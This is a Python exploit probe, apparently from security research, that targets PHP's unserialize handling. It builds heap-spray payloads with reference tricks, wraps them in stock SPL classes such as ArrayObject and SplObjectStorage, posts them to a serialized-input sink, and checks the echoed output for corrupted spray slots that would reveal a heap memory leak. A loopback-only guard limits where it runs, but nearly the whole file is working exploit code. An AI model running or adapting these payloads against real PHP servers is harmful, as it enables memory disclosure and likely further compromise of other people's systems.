#!/usr/bin/env python3
"""T4 probe: does a STOCK SPL class alone (no app-defined class at all)
route C: through the vulnerable zend_user_unserialize path?
Tests raw ArrayObject/SplDoublyLinkedList/SplObjectStorage against any
echo-serialized-input sink. Loopback only (RoE guard)."""
import socket, struct, sys

SPRAY_LEN = 280
SPRAY_COUNT = 120
MAX_REFS = 8

def leak_probe(t, payload, tag):
    try:
        out = t(payload)
    except Exception as e:
        print(f"  {tag}: transport error {e}"); return False
    if out is None:
        print(f"  {tag}: no reply"); return False
    idx = out.find(b"a:")
    if idx < 0:
        print(f"  {tag}: no array echo (len {len(out)}): {out[:80]!r}"); return False
    out = out[idx:]
    hits = 0
    search = 0
    while True:
        pos = out.find(b's:280:"', search)
        if pos < 0: break
        dstart = pos + 7
        if dstart + SPRAY_LEN > len(out): break
        sdata = out[dstart:dstart+SPRAY_LEN]
        for k in range(7):
            vo = 8 + (k+1)*32
            if vo + 8 > len(sdata): break
            curr = struct.unpack_from("<Q", sdata, vo)[0]
            if curr != 0xBBBB0000 + (k+1) and curr != 0x04 and curr > 0x10000:
                hits += 1
        search = dstart
    print(f"  {tag}: scribbled-spray slots seen = {hits}")
    return hits > 0

class Target:
    def __init__(self, host, port, path):
        self.host, self.port, self.path = host, port, path
    def __call__(self, payload):
        if self.host not in ("127.0.0.1", "localhost", "::1"):
            raise RuntimeError("RoE: loopback only")
        import urllib.parse
        body = urllib.parse.urlencode({"cook": payload}).encode()
        s = socket.create_connection((self.host, self.port), timeout=10)
        req = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\n"
               f"Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
        s.sendall(req)
        buf = b""
        try:
            while True:
                d = s.recv(65536)
                if not d: break
                buf += d
        except socket.timeout:
            pass
        s.close()
        i = buf.find(b"\r\n\r\n")
        return buf[i+4:] if i >= 0 else buf

def spray_array():
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k*32
        struct.pack_into("<I", spray, vo, 0xBBBB0000 + k)
        struct.pack_into("<I", spray, vo+8, 0x04)
    spray_b = bytes(spray)
    parts = [b"a:%d:{" % (1+SPRAY_COUNT+MAX_REFS)]
    parts.append(b'i:0;a:2:{s:1:"x";')
    for i in range(SPRAY_COUNT):
        parts.append(("i:%d;s:%d:\"" % (i+1, SPRAY_LEN)).encode() + spray_b + b'";')
    for k in range(MAX_REFS):
        parts.append(("i:%d;R:%d;" % (SPRAY_COUNT+1+k, REF_BASE if (REF_BASE:=2) else 2)).encode())
    parts.append(b"};}")
    # NOTE: shaping identical to CachedData path; only the wrapper differs.
    return b"".join(parts)

def inner_payload():
    """the nested a:{...} payload with spray + R refs (same shaping as heap_leak)"""
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k*32
        struct.pack_into("<I", spray, vo, 0xBBBB0000 + k)
        struct.pack_into("<I", spray, vo+8, 0x04)
    spray_b = bytes(spray)
    total = 1 + SPRAY_COUNT + MAX_REFS
    parts = [b"a:" + str(total).encode() + b":{"]
    parts.append(b'i:0;s:0:"";')  # property that will be written -> resize
    for i in range(SPRAY_COUNT):
        parts.append(("i:%d;s:%d:\"" % (i+1, SPRAY_LEN)).encode() + spray_b + b'";')
    for k in range(MAX_REFS):
        parts.append(("i:%d;R:%d;" % (SPRAY_COUNT+1+k, 1+k)).encode())
    parts.append(b"}")
    return b"".join(parts)

def wrap_gadget(name, inner):
    return ('C:%d:"%s":%d:' % (len(name), name, len(inner))) .encode() + b'{' + inner + b'}'

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8092/index.php"
    from urllib.parse import urlparse
    u = urlparse(url)
    t = Target(u.hostname, u.port or 80, u.path or "/")
    inner = inner_payload()
    for name in ["ArrayObject", "SplDoublyLinkedList", "SplObjectStorage", "SplQueue"]:
        print(f"[*] {name}")
        leak_probe(t, wrap_gadget(name, inner), name)
